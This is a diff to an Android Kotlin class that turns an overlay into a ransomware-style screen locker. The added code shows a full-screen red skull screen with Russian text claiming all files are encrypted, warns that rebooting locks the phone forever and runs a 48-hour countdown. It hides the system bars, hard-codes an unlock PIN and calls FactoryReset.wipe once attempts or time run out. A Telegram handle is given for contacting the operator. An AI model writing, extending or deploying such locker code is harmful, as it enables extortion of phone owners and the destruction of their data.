@@ -26,9 +26,9 @@ class LockOverlay(private val context: Context) {
     private var input: EditText? = null
     private var btn: Button? = null
 
-    private val correctPin = "fghmb"
-    private var attemptsLeft = 5
-    private var secondsLeft = 5 * 60
+    private val correctPin = "137117295"
+    private var attemptsLeft = 10
+    private var secondsLeft = 48 * 60 * 60 
     private var lockedOut = false
 
     private val tick = object : Runnable {
@@ -40,8 +40,12 @@ class LockOverlay(private val context: Context) {
                 goBlackout()
                 return
             }
-            timerText?.text = String.format("ОСТАЛОСЬ: %02d:%02d",
-                secondsLeft / 60, secondsLeft % 60)
+            
+            val h = secondsLeft / 3600
+            val m = (secondsLeft % 3600) / 60
+            val s = secondsLeft % 60
+            timerText?.text = String.format("%02d:%02d:%02d", h, m, s)
+            
             handler.postDelayed(this, 1000)
         }
     }
@@ -49,95 +53,103 @@ class LockOverlay(private val context: Context) {
     fun show() {
         if (view != null) return
         
-        // Главный контейнер (темный фон)
         val root = LinearLayout(context).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
-            setBackgroundColor(Color.parseColor("#050000"))
-            setPadding(50, 50, 50, 50)
+            setBackgroundColor(Color.parseColor("#CC0000"))
+            setPadding(40, 40, 40, 40)
         }
 
-        // Иконка черепа / предупреждения
-        val icon = TextView(context).apply {
+        val skullIcon = TextView(context).apply {
             text = "☠"
-            setTextColor(Color.parseColor("#FF0000"))
-            textSize = 64f
+            setTextColor(Color.BLACK)
+            textSize = 120f
             gravity = Gravity.CENTER
-            setShadowLayer(15f, 0f, 0f, Color.RED)
         }
 
-        val title = TextView(context).apply {
-            text = "СИСТЕМА ЗАБЛОКИРОВАНА"
-            setTextColor(Color.WHITE)
-            textSize = 24f
-            setShadowLayer(10f, 0f, 0f, Color.RED)
+        val warn1 = TextView(context).apply {
+            text = "ВСЕ ФАЙЛЫ ЗАШИФРОВАНЫ"
+            setTextColor(Color.BLACK)
+            textSize = 22f
             gravity = Gravity.CENTER
-            setPadding(0, 10, 0, 20)
         }
 
-        val warn = TextView(context).apply {
-            text = "ФАБРИЧНЫЙ СБРОС ЧЕРЕЗ:"
-            setTextColor(Color.parseColor("#AA0000"))
+        val warn2 = TextView(context).apply {
+            text = "НЕ ПЕРЕЗАГРУЖАЙТЕ ТЕЛЕФОН!\nПРИ ПОПЫТКЕ ПЕРЕЗАГРУЗКИ ОН БУДЕТ ЗАБЛОКИРОВАН НАВСЕГДА."
+            setTextColor(Color.BLACK)
+            textSize = 14f
+            gravity = Gravity.CENTER
+            setPadding(0, 10, 0, 10)
+        }
+
+        val warn3 = TextView(context).apply {
+            text = "ЕСЛИ НЕ ВВЕСТИ КОД, ТЕЛЕФОН СБРОСИТСЯ ДО ЗАВОДСКИХ НАСТРОЕК, И ВСЕ ДАННЫЕ БУДУТ СТЕРТЫ."
+            setTextColor(Color.BLACK)
+            textSize = 15f
+            gravity = Gravity.CENTER
+            setPadding(0, 0, 0, 15)
+        }
+
+        val timerTitle = TextView(context).apply {
+            text = "ОСТАЛОСЬ ВРЕМЕНИ:"
+            setTextColor(Color.BLACK)
             textSize = 16f
             gravity = Gravity.CENTER
         }
 
         timerText = TextView(context).apply {
-            text = "05:00"
-            setTextColor(Color.parseColor("#FF4444"))
-            textSize = 48f
+            text = "48:00:00"
+            setTextColor(Color.BLACK)
+            textSize = 40f
             gravity = Gravity.CENTER
-            setShadowLayer(20f, 0f, 0f, Color.RED)
-            setPadding(0, 0, 0, 20)
+            setPadding(0, 0, 0, 15)
         }
 
-        val warn2 = TextView(context).apply {
+        val attemptsTitle = TextView(context).apply {
             text = "ПОПЫТОК ВВОДА:"
-            setTextColor(Color.parseColor("#AA0000"))
+            setTextColor(Color.BLACK)
             textSize = 16f
             gravity = Gravity.CENTER
         }
 
         attemptsText = TextView(context).apply {
-            text = "5"
-            setTextColor(Color.WHITE)
-            textSize = 28f
+            text = "10"
+            setTextColor(Color.BLACK)
+            textSize = 24f
             gravity = Gravity.CENTER
-            setPadding(0, 0, 0, 30)
+            setPadding(0, 0, 0, 15)
         }
 
         input = EditText(context).apply {
             hint = "ВВЕДИТЕ КОД"
-            setTextColor(Color.WHITE)
-            setHintTextColor(Color.parseColor("#555555"))
+            setTextColor(Color.BLACK)
+            setHintTextColor(Color.parseColor("#880000"))
             gravity = Gravity.CENTER
-            textSize = 20f
+            textSize = 18f
             inputType = android.text.InputType.TYPE_CLASS_TEXT or
                     android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
             
-            // Красивая рамка для поля ввода
             val bg = GradientDrawable().apply {
                 setColor(Color.TRANSPARENT)
-                setStroke(4, Color.parseColor("#880000"))
-                cornerRadius = 15f
+                setStroke(4, Color.BLACK)
+                cornerRadius = 10f
             }
             background = bg
             setPadding(20, 20, 20, 20)
         }
 
         btn = Button(context).apply {
-            text = "РАЗБЛОКИРОВАТЬ"
+            text = "ПРОВЕРИТЬ"
             setTextColor(Color.WHITE)
-            setBackgroundColor(Color.parseColor("#880000"))
+            setBackgroundColor(Color.BLACK)
             setPadding(20, 20, 20, 20)
             setOnClickListener { checkPassword() }
         }
 
-        // Кнопки Telegram и VPN (в самом низу)
         val tgBtn = Button(context).apply {
-            text = "TG: @qwerty112005"
+            text = "Написать в Telegram: @qwerty112005"
             setBackgroundColor(Color.TRANSPARENT)
-            setTextColor(Color.parseColor("#4444FF"))
+            setTextColor(Color.BLACK)
             setOnClickListener {
                 if (!AppLauncher.openTelegram(context))
                     attemptsText?.text = "TG не найден"
@@ -145,20 +157,22 @@ class LockOverlay(private val context: Context) {
         }
 
         val vpnBtn = Button(context).apply {
-            text = "ОТКРЫТЬ VPN"
+            text = "Включить VPN"
             setBackgroundColor(Color.TRANSPARENT)
-            setTextColor(Color.parseColor("#4444FF"))
+            setTextColor(Color.BLACK)
             setOnClickListener {
                 if (!AppLauncher.openVpn(context))
                     attemptsText?.text = "VPN не найден"
             }
         }
 
-        root.addView(icon)
-        root.addView(title)
-        root.addView(warn)
-        root.addView(timerText)
+        root.addView(skullIcon)
+        root.addView(warn1)
         root.addView(warn2)
+        root.addView(warn3)
+        root.addView(timerTitle)
+        root.addView(timerText)
+        root.addView(attemptsTitle)
         root.addView(attemptsText)
         root.addView(input)
         root.addView(btn)
@@ -172,11 +186,25 @@ class LockOverlay(private val context: Context) {
             WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                     WindowManager.LayoutParams.FLAG_FULLSCREEN or
                     WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
-                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS, 
             PixelFormat.TRANSLUCENT
         )
         wm.addView(root, params)
         view = root
+
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+            root.windowInsetsController?.hide(android.view.WindowInsets.Type.systemBars())
+            root.windowInsetsController?.systemBarsBehavior = android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
+        } else {
+            @Suppress("DEPRECATION")
+            root.systemUiVisibility = android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
+                    android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
+                    android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
+                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
+                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
+                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+        }
 
         music.start()
         handler.postDelayed(tick, 1000)
@@ -204,10 +232,11 @@ class LockOverlay(private val context: Context) {
         music.stop()
         vibrate(1500)
         hide()
+        FactoryReset.wipe(context)
         BlackoutOverlay(context).start {
-            attemptsLeft = 5
+            attemptsLeft = 10
             lockedOut = false
-            secondsLeft = 5 * 60
+            secondsLeft = 48 * 60 * 60
             show()
         }
     }
